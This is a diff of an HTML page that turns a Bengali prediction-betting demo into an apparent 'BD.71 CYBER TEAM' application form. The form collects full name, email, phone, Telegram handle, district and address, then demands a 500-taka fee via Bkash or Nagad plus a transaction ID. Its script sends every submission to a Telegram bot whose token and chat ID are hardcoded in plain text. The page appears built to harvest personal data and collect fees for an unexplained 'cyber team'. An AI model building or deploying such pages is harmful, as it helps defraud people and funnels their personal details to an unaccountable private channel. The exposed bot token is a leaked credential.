@@ -1,83 +1,232 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>প্রেডিকশন বেটিং</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BD.71 CYBER TEAM</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f4f4f4;
-      padding: 20px;
+      font-family: sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
     }
-    .question {
+
+    .container {
+      max-width: 550px;
+      margin: 40px auto;
       background: #fff;
-      padding: 15px;
-      margin-bottom: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .question h3 {
-      margin-top: 0;
+
+    h1 {
+      text-align: center;
+      color: #333;
     }
-    .options button {
-      margin-right: 10px;
-      margin-top: 10px;
-      padding: 8px 15px;
-      border: none;
+
+    .form-step {
+      display: none;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
       border-radius: 5px;
-      background-color: #0088cc;
-      color: white;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 20px;
+      background: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
     }
-    .options button:hover {
-      background-color: #006b99;
+
+    #paymentNumber {
+      display: none;
+      margin-top: 15px;
+      background: #eef9ee;
+      padding: 10px;
+      border-radius: 5px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .copy-btn {
+      background: #28a745;
+      padding: 5px 10px;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .payment-info {
+      background: #ffe6e6;
+      padding: 10px;
+      border-radius: 5px;
+      color: #c0392b;
+      margin-bottom: 15px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <h2>প্রেডিকশন বেটিং অ্যাপ</h2>
-  <div id="questions-container"></div>
 
-  <script>
-    const questions = [
-      {
-        id: 1,
-        text: "আগামীকাল কি বৃষ্টি হবে?",
-        options: ["হ্যাঁ", "না"]
-      },
-      {
-        id: 2,
-        text: "বাংলাদেশ কি ম্যাচ জিতবে?",
-        options: ["জিতবে", "হারবে"]
+<div class="container">
+  <h1>BD.71 CYBER TEAM</h1>
+  <form id="multiStepForm">
+    <!-- Step 1 -->
+    <div class="form-step active" id="step1">
+      <label>Full Name:
+        <input type="text" name="name" required>
+      </label>
+      <label>Email Address:
+        <input type="email" name="email" required>
+      </label>
+      <label>Phone Number:
+        <input type="text" name="phone" required>
+      </label>
+      <label>Telegram Username:
+        <input type="text" name="telegram" required>
+      </label>
+      <label>District:
+        <input type="text" name="district" required>
+      </label>
+      <label>Current Address:
+        <input type="text" name="address" required>
+      </label>
+      <button type="button" onclick="nextStep()">Next</button>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="form-step" id="step2">
+      <div class="payment-info">
+        আপনাকে এই ফরমটি অ্যাপ্লাই করার জন্য ৫০০ টাকা পে করতে হবে।
+      </div>
+
+      <label><input type="radio" name="method" value="Bkash" onchange="showNumber(this.value)"> Bkash</label>
+      <label><input type="radio" name="method" value="Nagad" onchange="showNumber(this.value)"> Nagad</label>
+
+      <div id="paymentNumber">
+        <span id="numberText"></span>
+        <button type="button" class="copy-btn" onclick="copyNumber()">Copy</button>
+      </div>
+
+      <label>Transaction ID:
+        <input type="text" name="trxid" required>
+      </label>
+      <button type="submit">Submit</button>
+    </div>
+  </form>
+</div>
+
+<script>
+  function nextStep() {
+    const inputs = document.querySelectorAll('#step1 input');
+    let valid = true;
+    inputs.forEach(input => {
+      if (!input.value.trim()) {
+        input.style.border = '2px solid red';
+        valid = false;
+      } else {
+        input.style.border = '1px solid #ccc';
       }
-    ];
+    });
 
-    function renderQuestions() {
-      const container = document.getElementById("questions-container");
-      container.innerHTML = "";
-      questions.forEach(q => {
-        const div = document.createElement("div");
-        div.className = "question";
-        div.innerHTML = `<h3>${q.text}</h3>`;
-        const optionsDiv = document.createElement("div");
-        optionsDiv.className = "options";
-        q.options.forEach(opt => {
-          const btn = document.createElement("button");
-          btn.innerText = opt;
-          btn.onclick = () => handleVote(q.id, opt);
-          optionsDiv.appendChild(btn);
-        });
-        div.appendChild(optionsDiv);
-        container.appendChild(div);
-      });
+    if (valid) {
+      document.getElementById('step1').classList.remove('active');
+      document.getElementById('step2').classList.add('active');
+    } else {
+      alert("Please fill in all fields before proceeding.");
     }
+  }
 
-    function handleVote(questionId, selectedOption) {
-      alert(`আপনি "${selectedOption}" সিলেক্ট করেছেন (প্রশ্ন ID: ${questionId})`);
+  function showNumber(method) {
+    const numText = document.getElementById('numberText');
+    const box = document.getElementById('paymentNumber');
+    if (method === "Bkash") {
+      numText.textContent = "Send money to this Bkash number: 01XXXXXXXXX";
+    } else if (method === "Nagad") {
+      numText.textContent = "Send money to this Nagad number: 01YYYYYYYYY";
     }
+    box.style.display = 'flex';
+  }
 
-    renderQuestions();
-  </script>
+  function copyNumber() {
+    const text = document.getElementById('numberText').textContent;
+    const match = text.match(/01[0-9]{9}/);
+    if (match) {
+      navigator.clipboard.writeText(match[0]);
+      alert("Number copied!");
+    }
+  }
+
+  document.getElementById('multiStepForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData.entries());
+
+    const message = `
+New Form Submission:
+---------------------
+Name: ${data.name}
+Email: ${data.email}
+Phone: ${data.phone}
+Telegram Username: ${data.telegram}
+District: ${data.district}
+Address: ${data.address}
+Payment Method: ${data.method}
+Transaction ID: ${data.trxid}
+    `;
+
+    const token = "7913814446:AAGurcEzk5jVsL0fIawi7CBeuzAWnKYRfXA";
+    const chatId = "7316458945";
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(res => res.json())
+    .then(res => {
+      if (res.ok) {
+        alert("Form submitted & sent to Telegram!");
+      } else {
+        alert("Failed to send message to Telegram.");
+      }
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Error sending to Telegram.");
+    });
+  });
+</script>
+
 </body>
 </html>
